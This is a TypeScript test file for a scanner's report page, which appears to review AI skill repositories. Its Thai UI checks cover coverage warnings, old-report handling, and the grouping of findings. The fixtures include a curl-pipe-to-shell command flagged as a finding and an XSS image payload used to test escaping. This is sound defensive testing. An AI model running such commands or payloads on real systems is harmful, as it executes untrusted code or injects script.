import { createElement, useState, type ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, describe, expect, it, vi } from "vitest";
import { Report } from "./report";

vi.mock("react", async (importOriginal) => {
  const react = await importOriginal<typeof import("react")>();
  return { ...react, useState: vi.fn(react.useState) };
});
vi.mock("@/components/ui/button", () => ({
  Button: ({ children }: { children: ReactNode }) => createElement("button", null, children),
}));
vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn() }) }));

const completed = {
  id: "test", repo: "demo/repo", commitSha: "abc", status: "done", step: null,
  error: null, score: 100, riskLevel: "none_found", scannerVersion: "0.3.1",
  coverage: [{ path: "SKILL.md", status: "full" }], findings: [],
};

function render(data: object) {
  vi.mocked(useState).mockReturnValueOnce([data, vi.fn()]);
  return renderToStaticMarkup(createElement(Report, { id: "test" }));
}

afterEach(() => vi.clearAllMocks());

describe("report coverage", () => {
  it("shows a complete current report normally", () => {
    const html = render(completed);
    expect(html).toContain("คะแนน 100/100");
    expect(html).toContain("ครบทุกไฟล์");
    expect(html).not.toContain('role="alert"');
  });

  it("warns about historical coverage and hides its score", () => {
    const html = render({ ...completed, scannerVersion: "0.3.0" });
    expect(html).toContain("รายงานรุ่นเก่า");
    expect(html).not.toContain("คะแนน 100/100");
  });

  it("warns prominently when any file was skipped", () => {
    const html = render({ ...completed, coverage: [
      ...completed.coverage, { path: "data.unknown", status: "skipped", reason: "พบ NUL" },
    ] });
    expect(html).toContain("ตรวจไม่ครบ");
    expect(html).toContain("ผลและคะแนนครอบคลุมเฉพาะส่วนที่ตรวจได้");
    expect(html).toContain("พบ NUL");
  });

  it("does not show a perfect score when coverage is missing", () => {
    const html = render({ ...completed, coverage: [] });
    expect(html).toContain("ข้อมูลไม่เพียงพอสำหรับประเมิน");
    expect(html).not.toContain("คะแนน 100/100");
    expect(html).not.toContain("ครบทุกไฟล์");
  });

  it.each(["0.1.0", "0.2.0", "0.2.1", "0.2.2", "0.3.0"])("treats scanner %s reports as old", (version) => {
    const html = render({ ...completed, scannerVersion: version });
    expect(html).toContain("รายงานรุ่นเก่า");
    expect(html).not.toContain("คะแนน 100/100");
    expect(html).not.toContain("ครบทุกไฟล์");
  });

  it("does not treat a newer scanner version as old", () => {
    const html = render({ ...completed, scannerVersion: "0.4.0" });
    expect(html).not.toContain("รายงานรุ่นเก่า");
    expect(html).toContain("คะแนน 100/100");
  });

  it("shows file reasons when all files failed inspection", () => {
    const html = render({ ...completed, status: "failed", score: null,
      error: "ข้อมูลไม่เพียงพอสำหรับประเมิน",
      coverage: [{ path: "SKILL.md", status: "skipped", reason: "พบ NUL" }],
    });
    expect(html).toContain("ข้อมูลไม่เพียงพอสำหรับประเมิน");
    expect(html).toContain("SKILL.md");
    expect(html).toContain("พบ NUL");
    expect(html).not.toContain("100/100");
  });
});

const finding = (over: object = {}) => ({
  severity: "high",
  rule: "script.pipe-to-shell",
  file: "scripts/setup.sh",
  line: 18,
  message: "พบคำสั่งดาวน์โหลดไฟล์แล้วสั่งรัน",
  excerpt: "curl https://example.com/x | sh",
  ...over,
});

const manyFiles = [
  ...Array.from({ length: 12 }, (_, i) => ({ path: `f${i}.md`, status: "full" })),
  { path: "references/data.json", status: "partial", reason: "ไฟล์ใหญ่" },
  { path: "references/catalog.txt", status: "partial", reason: "ไฟล์ใหญ่" },
  { path: "assets/logo.png", status: "skipped", reason: "ไฟล์ภาพ" },
];

describe("report layout", () => {
  it("shows the real risk level, finding count, score and file counts", () => {
    const html = render({
      ...completed,
      riskLevel: "high",
      score: 72,
      findings: [finding(), finding({ severity: "medium", file: "SKILL.md", line: 24 }), finding({ severity: "low" })],
      coverage: manyFiles,
    });
    expect(html).toMatch(/ระดับความเสี่ยง/);
    expect(html).toMatch(/text-orange-700[^>]*>สูง</);
    expect(html).toContain("พบ 3 รายการ · คะแนน 72/100");
    expect(html).toMatch(/อ่านครบ<\/dt><dd[^>]*>12</);
    expect(html).toMatch(/อ่านบางส่วน<\/dt><dd[^>]*>2</);
    expect(html).toMatch(/ข้าม<\/dt><dd[^>]*>1</);
    expect(html).toContain("ตรวจไม่ครบ · มี 3 รายการ");
    expect(html).toContain('href="#coverage"');
    expect(html).toContain("ไฟล์ที่อ่านบางส่วนหรือข้าม");
    expect(html).toContain("assets/logo.png");
  });

  it("sums up skipped files by reason and keeps every one of them one tap away", () => {
    const skipped = Array.from({ length: 30 }, (_, i) => ({ path: `skip${i}.md`, status: "skipped", reason: "เกินจำนวนไฟล์" }));
    const html = render({ ...completed, coverage: [...completed.coverage, ...skipped] });
    expect(html).toContain("ตรวจไม่ครบ · มี 30 รายการ");
    expect(html).toContain("ข้าม 30 ไฟล์");
    expect(html).toContain("ดูทั้ง 30 รายการ");
    expect((html.match(/เกินจำนวนไฟล์/g) ?? []).length).toBe(31); // one summary line + one per file
    for (const f of skipped) expect(html).toContain(f.path); // nothing is dropped, only folded
  });

  it("opens only the first finding and shows its file and line", () => {
    const html = render({ ...completed, riskLevel: "high", findings: [finding(), finding({ line: 40 })] });
    expect((html.match(/<details open=""/g) ?? []).length).toBe(1);
    expect(html).toContain("scripts/setup.sh:18");
    expect(html).toContain("scripts/setup.sh:40");
  });

  it("states how many files were read next to the risk level", () => {
    const html = render({ ...completed, riskLevel: "medium", score: 90, findings: [finding({ severity: "medium" })], coverage: manyFiles });
    expect(html).toContain("อ่านครบ 12 จาก 15 ไฟล์");
    expect(html).toContain("ไม่ได้บอกว่า skill ปลอดภัยกี่เปอร์เซ็นต์");
  });

  it("groups findings by skill and lists the skills with nothing found", () => {
    const html = render({
      ...completed,
      riskLevel: "high",
      findings: [finding({ file: "skills/deploy/scripts/setup.sh" })],
      coverage: [
        { path: "skills/deploy/SKILL.md", status: "full" },
        { path: "skills/deploy/scripts/setup.sh", status: "full" },
        { path: "skills/pdf/SKILL.md", status: "full" },
        { path: "skills/docs/SKILL.md", status: "skipped", reason: "เกินจำนวนไฟล์" },
        { path: "README.md", status: "full" },
      ],
    });
    expect(html).toContain("อยู่ใน 1 จาก 4 กลุ่มไฟล์");
    expect(html).toMatch(/<h3[^>]*>deploy<\/h3>/);
    expect(html).toContain("scripts/setup.sh:18");
    expect(html).toContain("อีก 3 กลุ่มไฟล์ไม่พบรายการที่ตรงกับกฎ (ในนั้น 1 กลุ่มตรวจไม่ครบ)");
    expect(html).toContain("ตรวจไม่ครบ 1 จาก 1 ไฟล์");
    expect(html).toContain("ไฟล์นอกโฟลเดอร์ skill");
  });

  it("prints finding text as text, never as HTML", () => {
    const html = render({
      ...completed,
      riskLevel: "high",
      findings: [finding({ excerpt: "<img src=x onerror=alert(1)>", message: "<b>x</b>" })],
    });
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&lt;img src=x");
    expect(html).toContain("&lt;b&gt;x&lt;/b&gt;");
  });

  it("never calls a clean result safe", () => {
    const html = render(completed);
    expect(html).toContain("ไม่พบปัญหาที่รู้จัก");
    expect(html).toContain("ไม่ได้แปลว่าปลอดภัย");
    expect(html).toContain("ไม่พบรายการที่ตรงกับกฎที่รู้จัก");
  });

  it("offers the re-check button on finished and failed reports, not while scanning", () => {
    expect(render(completed)).toContain("ตรวจเวอร์ชันล่าสุด");
    expect(render({ ...completed, status: "failed", score: null, error: "x", coverage: [] })).toContain(
      "ตรวจเวอร์ชันล่าสุด",
    );
    const running = render({ ...completed, status: "running", step: "กำลังดึงไฟล์จาก GitHub" });
    expect(running).not.toContain("ตรวจเวอร์ชันล่าสุด");
    expect(running).toContain("กำลังดึงไฟล์จาก GitHub");
  });

  it("keeps a live region for the re-check status", () => {
    expect(render(completed)).toMatch(/<p role="status" aria-live="polite"/);
  });

  it("points an old report at the button", () => {
    const html = render({ ...completed, scannerVersion: "0.3.0" });
    expect(html).toContain("“ตรวจเวอร์ชันล่าสุด”");
  });
});
